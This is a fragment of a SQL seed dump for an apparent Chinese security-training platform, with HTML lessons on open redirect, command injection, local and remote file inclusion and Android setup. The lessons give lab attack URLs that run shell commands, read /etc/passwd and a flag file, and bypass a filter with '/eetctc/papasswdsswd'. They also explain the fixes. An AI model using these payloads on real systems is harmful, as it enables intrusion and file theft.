src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg\"></p><p></p><p>上面为修复以后的代码片段。</p><p><br></p>',1,'<p>CSRF基础训练二课后拓展部分</p><p><br></p>'),(30,'URL重定向基础训练','URL重定向基础训练的描述，非常好的漏洞练习','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用URL重定向跳转到其它网站的例子</span></h1><p>打开WEB系统URL重定向测试页面，添加参数callback；如下:</p><p>http://***/vulnerabilities/web/Cam_request/cam_urlredir/index.php?callback=1</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:95.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/u1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>通过测试发现可以跳转。</p><p>测试callback参数的值为其它网站链接；如：</p><p>http://*****/vulnerabilities/web/Cam_request/cam_urlredir/index.php?callback=http://ww.so.com</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:103.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/u2.png\" style=\"line-height: 1; max-width: 100%;\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/u3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:254.25pt;height:57pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"></v:imagedata></v:shape></p><p>成功跳转到360搜索的首页，漏洞测试成功。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/url.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:13:28',1,NULL,'<h2><span style=\"font-size: 14px;\">1）URL重定向的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/u4.png\"></p><p>直接看代码，很简单，服务端接收到前端传递过来的数据没有做任何过滤直接做了跳转。这种漏洞最直接的利用就是钓鱼。对于一些非技术的朋友来说可能被重定向到钓鱼页面。但是他自己并不能分辨真伪，造成损失。</p><p>2）URL重定向的防范</p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/u5.png\">（截图有问题，需要修改）</p><p>通过上面的代码我们可以防范的做法是限制参数的跳转域名。如果是非本系统的域名则不能跳转。修复代码如下</p><p></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/u6.png\"></p><p><br></p>',1,'<p>URL重定向基础训练的描述，非常好的漏洞练习 课后拓展</p><p><br></p>'),(31,'命令注入基础训练一','命令注入基础训练一的描述','<h1><span style=\"font-size: 14px;\">1）进入攻防练习系统中的web模块，选择注入页中的命令注入项。然后在浏览器地址栏中输入常用的命令进行操作(注意需要输入linux命令)。</span><br></h1><p>2）vulnerabilities/web/Inject/cmd_inje/index.php?id=/sbin/ifconfig。系统将显示服务器的网口信息。(直接输入ifconfig看看行不行考虑为什么？)。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:216.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>3）输入其它命令也可以显示对应的系统命令执行的结果。</p><p>vulnerabilities/web/Inject/cmd_inje/index.php?id=id</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:387pt;height:150pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>4）学员可以尝试输入其它的系统命令一遍更多的学习</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A51.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:14:23',1,NULL,'<h2><span style=\"font-size: 14px;\">1）命令注入的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd3.png\"></p><p>通过查看上面的源码可以看出，写代码的人直接通过$_REQUEST[‘id’]得到前端输入的数据。直接将数据带入能执行系统命令的函数shell_exec当中去执行了。所以造成了命令注入。恶意攻击者可以直接通过输入命令得到服务器的相关信息。</p><p>2）在某些系统中确实需要执行命令的情况下如何防止命令注入带来的危害</p><p></p><p>对于系统中如果确实需要执行特定的系统命令可以直接把系统命令写死，在后端限制只能执行的系统命令，而不是不做任何限制可以让恶意攻击者输入任何系统命令。</p><p><br></p>',1,'<p>命令注入基础训练一 拓展</p><p><br></p>'),(32,'命令注入基础训练二','命令注入基础训练二的描述','<h1><span style=\"font-size: 14px;\">1）进入攻防练习系统中的web模块，选择注入页中的命令注入项。然后在浏览器地址栏中输入常用的命令进行操作(注意需要输入linux命令)。</span><br></h1><p>2）这一节我们通过命令注入做一个简单的ctf训练。</p><p>3）vulnerabilities/web/Inject/cmd_inje/index.php?action=medium&amp;id=cat%20index.php\r\n可以读到index.php的部分源码，通过源码可以得到flag的存放位置。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:245.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>4）查看下/var/www/html目录</p><p>vulnerabilities/web/Inject/cmd_inje/index.php?action=medium&id=ls%20/var/www/html</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:111.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>找到flag.txt文件并且直接查看这个文件。</p><p>vulnerabilities/web/Inject/cmd_inje/index.php?action=medium&id=cat%20/var/www/html/flag.txt</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:111pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cmd23.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>得到了加密的flag。然后去<a href=\"http://www.cmd5.com\">www.cmd5.com</a>解密。解密后得到的结果为：good</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A52.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:15:03',1,NULL,'<h2><span style=\"font-size: 14px;\">关于命令注入的原理上一节课已经说的很清楚了。这一节课主要是设置了一个简单的ctf训练来熟悉命令注入所带来的威力。同时也提前让学员熟悉一下ctf相关的东西，后面的课程我们会有更高级的ctf训练题供学员学习。</span><br></h2><p><br></p>',1,'<p>命令注入基础训练 扩展</p><p><br></p>'),(33,'XXE漏洞基础训练','XXE漏洞基础训练 描述部分','<p>XXE漏洞基础训练 &nbsp;报告</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xxe%E6%B3%A8%E5%85%A5.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:16:02',1,NULL,'<p>XXE漏洞基础训练 分析</p><p><br></p>',1,'<p>XXE漏洞基础训练 扩展</p><p><br></p>'),(34,'移动安全基础训练一','移动安全基础课程训练开发篇','<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Android开发环境搭建</p><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n安装JDK1.8，按系统版本去Oracle官网下载最新的JDK.</p><p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n下面开始配置环境变量，右击【我的电脑】---【属性】-----【高级】---【环境变量】，选择【新建系统变量】--弹出“新建系统变量”对话框，在“变量名”文本框输入“JAVA_HOME”,在“变量值”文本框输入JDK的安装路径，单击“确定”按钮，如图：</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1036\" type=\"#_x0000_t75\" style=\"width:165pt;height:170.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"4$[LXB0PQN(}W@$ZYO@D(XL\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>在“系统变量”选项区域中查看PATH变量，如果不存在，则新建变量 PATH，否则选中该变量，单击“编辑”按钮，在“变量值”文本框的起始位置添加“%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;”或者是直接“%JAVA_HOME%\\bin;”，单击确定按钮，如图：</p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1035\" type=\"#_x0000_t75\" style=\"width:165pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"94X~ZM~Z1S8`J82QRD_`8VJ\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>在“系统变量”选项区域中查看CLASSPATH 变量，如果不存在，则新建变量CLASSPATH，否则选中该变量，单击“编辑”按钮，在“变量值”文本框的起始位置添加“.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar;”。如图：</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1034\" type=\"#_x0000_t75\" style=\"width:165pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>现在测试环境变量的配置成功与否。在DOS命令行窗口输入“JAVAC”，输出帮助信息即为配置正确。如图：</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.4.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>&nbsp;3.&nbsp;\r\n安装AndroidStudio2.2,推荐直接下载系统对应版本的最新android-studio-bundle，此为带SDK Tools的版本。默认android studio没有安装NDK和模拟器镜像，我们推荐使用第三方模拟器Bluestacks.</p><p>4.&nbsp;\r\n至此安卓开发环境已经搭建好了，下面创建一个helloworld项目，跑起来溜溜。</p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" style=\"width:287.25pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"0EGFI5KN%F8`[)7%1WDKRH2\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>选择Start a new Android Studio project新建一个项目。</p><p><v:shape id=\"图片_x0020_6\" o:spid=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:243pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"Y}AM)MSRMY(`Q`~6C4{%($G\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>Application name为app名称</p><p>Company Domain为程序包名</p><p>Project location为工程存放路径</p><p>点Next后，这里进入匹配兼容设置。</p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:341.25pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:title=\"W~P$1X5AS1$8SDNBA0K4J68\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image014.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.7.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>这里保持默认就好。</p><p>点Next后，进入Activity的演示选择，这里选择一个Empty Activity.</p><p><v:shape id=\"图片_x0020_8\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:282pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image015.png\" o:title=\"Z]NOUA1V4T3T_2L5XDU$$E2\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image016.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.8.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>点Next后，这里设置添加的Activity对应的java文件名和layout文件名，这里我们默认就好，点Finish后一个带helloworld的工程就建好了。</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.9.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"图片_x0020_9\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:350.25pt;height:86.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image017.png\" o:title=\"M{AWG1CIX0%~N}[W8F6]`HI\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image017.png\"></v:imagedata></v:shape></p><p>接下来将Bluestacks打开，点击androidstudio箭头跑跑，弹出</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.10.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"图片_x0020_10\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:216.75pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image018.png\" o:title=\"0X1JPKR(94522J`QC`5XSGH\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image019.jpg\"></v:imagedata></v:shape></p><p>BlueStacks在这里会以真实的硬件显示.</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.11.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"图片_x0020_11\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:415.5pt;height:78pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image020.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image021.jpg\"></v:imagedata></v:shape></p><p>这里选proceed without Instant Run.</p><p><v:shape id=\"图片_x0020_12\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:264.75pt;height:170.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image022.png\" o:title=\"S{$_U}JUYZ$W20WGX5Q`(XH\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image023.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%931.12.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>5.至此android开发环境搭建并测试成功。</p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-09-25 15:15:06',1,NULL,'<p>请看课程报告</p><p><br></p>',0,'<p>基础训练</p><p>基础训练</p><p><br></p>'),(35,'本地文件包含基础训练一','通过部署课程学习本地文件包含漏洞','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用本地文件包含漏洞包含ect/passwd的例子</span></h1><p>打开WEB系统本地文件包含漏洞测试页面；如下:</p><p>http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?page=include.php</p><p>http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?page=/etc/passwd</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:89.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/l1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>文件包含成功，并显示系统用户信息。</p><p>尝试包含远程文件是试一试</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:44.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/l2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:27:14',1,NULL,'<h2><span style=\"font-size: 14px;\">1）本地文件包含漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/l3.png\"></p><p>这个代码在远程文件包含漏洞一节中已经讲解过了。没做任何过滤直接做了文件包含</p><p>2）本地文件包含漏洞的防范</p><p></p><p>查看远程文件包含漏洞基础训练一</p><p><br></p>',1,''),(36,'本地文件包含基础训练二','通过攻防教学实验系统中的web系统做本地文件包含漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用本地文件包含漏洞包含etc/passwd文件的例子</span></h1><p>打开WEB系统本地文件包含漏洞测试页面；如下:</p><p>http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?page=include.php</p><p><a href=\"http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?action=medium&page=/etc/passwd\">http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?action=medium&amp;page=/etc/passwd</a></p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:78pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/l21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>我们发现这次并不能像第一节讲的那样包含成功,我们吧语句改成下面的形式。</p><p><a href=\"http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?action=medium&page=/eetctc/papasswdsswd\">http://***/vulnerabilities/web/File_contains/fi_include_l/index.php?action=medium&amp;page=/eetctc/papasswdsswd</a></p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/l22.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:83.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>文件包含成功，并显示系统用户信息.</p><p><br></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:28:22',1,NULL,'<h2><span style=\"font-size: 14px;\">1）本地文件包含漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/l23.png\"></p><p>通过上面的代码可以发现在include文件的时候做了一些简单的过滤。但是这种过滤是可以被绕过的。</p><p>比如：/eetctc/papasswdsswd 这种形式被替换以后正好变成我们需要包含的正常形式 /etc/passwd</p><p>2）本地文件包含漏洞的防范</p><p></p><p>查看远程文件包含漏洞基础训练一。</p><p><br></p>',1,'<p>2</p><p><br></p>'),(37,'远程文件包含基础训练一','通过攻防教学实验系统中的web系统做远程文件包含漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">1）下面是在WEB系统中利用远程文件包含漏洞的例子</span><br></h1><p>打开WEB系统本地文件包含漏洞测试页面；如下:</p><p>http://****/vulnerabilities/web/File_contains/fi_include_l/index.php?page=include.php</p><p>http://****/vulnerabilities/web/File_contains/fi_include_l/index.php?page=/etc/passwd</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:115.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rr1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>文件包含成功，并显示系统用户信息。</p><p>测试远程文件包含漏洞,访问百度随便找一个图片地址复制链接；修改page的参数为复制的图片链接信息；如下:</p><p>http://##/webTest/vulnerabilities/web/File_contains/fi_include_r/index.php?page=http://a1.att.hudong.com/41/11/19300001058918132210114381264.jpg</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:382.5pt;height:180.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img 